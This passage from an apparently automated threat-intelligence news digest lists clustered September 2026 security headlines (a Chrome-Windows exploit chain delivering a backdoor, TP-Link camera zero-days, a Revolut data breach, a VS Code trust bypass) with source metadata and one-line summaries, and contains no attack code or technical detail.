A Chinese threat actor has been attributed to a spear-phishing campaign that exploits recently patched security flaws in Google Chrome and Microsoft Windows to deliver a malicious JavaScript backdoor called GRIMWEDGE. Volexity, which is tracking the threat cluster under the moniker UTA0560, said the activity targeted multiple non-governmental organizations (NGOs) on September 1, 2026. "The
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: China-Linked Hackers Exploit Chrome-Windows Zero-Day Chain to Deploy GRIMWEDGE
  - Published: 2026-09-15T05:31:05+00:00
  - Link: https://thehackernews.com/2026/09/china-linked-hackers-exploit-chrome.html
  - Summary: A Chinese threat actor has been attributed to a spear-phishing campaign that exploits recently patched security flaws in Google Chrome and Microsoft Windows to deliver a malicious JavaScript backdoor called GRIMWEDGE. Volexity, which is tracking the threat cluster under the moniker UTA0560, said the activity targeted multiple non-governmental organizations (NGOs) on September 1, 2026. "The

### Cluster 6bdf6b374f — score 8

- Title: Zero-Day Flaw in TP-Link Cameras Enables Eavesdropping
- Source: Infosecurity Magazine (cyber_news_breach_reporting)
- Published: 2026-09-16T10:00:00+00:00
- Link: https://www.infosecurity-magazine.com/news/zeroday-tplink-cameras/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: zero_day
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
OPSWAT researchers find two zero-days in TP-Link cameras
```

#### Corroborating sources (1)

- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: Zero-Day Flaw in TP-Link Cameras Enables Eavesdropping
  - Published: 2026-09-16T10:00:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/zeroday-tplink-cameras/
  - Summary: OPSWAT researchers find two zero-days in TP-Link cameras

### Cluster 37c5b50190 — score 8

- Title: Revolut Confirms Data Breach Through Fake Government Requests
- Source: Infosecurity Magazine (cyber_news_breach_reporting)
- Published: 2026-09-14T11:20:00+00:00
- Link: https://www.infosecurity-magazine.com/news/revolut-data-breach-fake-government/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach
- affected_industries: government
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: data_breach
- affected_industries: government
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
An unauthorized party used a legitimate government email domain to fraudulently request Revolut customer data
```

#### Corroborating sources (1)

- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: Revolut Confirms Data Breach Through Fake Government Requests
  - Published: 2026-09-14T11:20:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/revolut-data-breach-fake-government/
  - Summary: An unauthorized party used a legitimate government email domain to fraudulently request Revolut customer data

### Cluster b67e9049d1 — score 8

- Title: Visual Studio Code Vulnerability that Bypasses Workspace Trust
- Source: Reddit r/netsec (reddit_practitioner_osint)
- Published: 2026-09-17T13:45:38+00:00
- Link: https://www.reddit.com/r/netsec/comments/1wiufye/visual_studio_code_vulnerability_that_bypasses/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: vulnerability_disclosure
- confidence_tier: tier_5_chatter

#### Primary article taxonomy
- content_type: vulnerability_disclosure
- confidence_tier: tier_5_chatter

#### Summary

```
submitted by /u/HyprWave [link] [comments]
```

#### Corroborating sources (1)

- **Reddit r/netsec** (reddit_practitioner_osint)
  - Title: Visual Studio Code Vulnerability that Bypasses Workspace Trust
  - Published: 2026-09-17T13:45:38+00:00
  - Link: https://www.reddit.com/r/netsec/comments/1wiufye/visual_studio_code_vulnerability_that_bypasses/
  - Summary: submitted by /u/HyprWave [link] [comments]
